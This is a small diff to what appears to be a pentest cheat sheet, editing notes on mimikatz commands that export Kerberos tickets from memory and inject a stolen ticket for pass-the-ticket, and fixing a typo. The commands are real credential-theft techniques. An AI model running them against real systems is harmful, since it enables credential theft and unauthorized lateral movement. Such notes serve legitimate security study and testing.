@@ -43,10 +43,10 @@ mimikatz # kerberos::list
 
 Exporting all tickets(TGTs and TGSs) with mimikatz:
 
-mimikatz # sekurlsa::tickets /export   -> note that the TGTs can only be used from the machine they where generated on, the TGSs can be used elsewhere
+mimikatz # sekurlsa::tickets /export   
 
 
-Injecting some ticket into memoeyr with mimikatz:
+Injecting some ticket into memory with mimikatz:
 
 mimikatz # kerberos::ptt 'C:\ticket.kirbi'
 ```
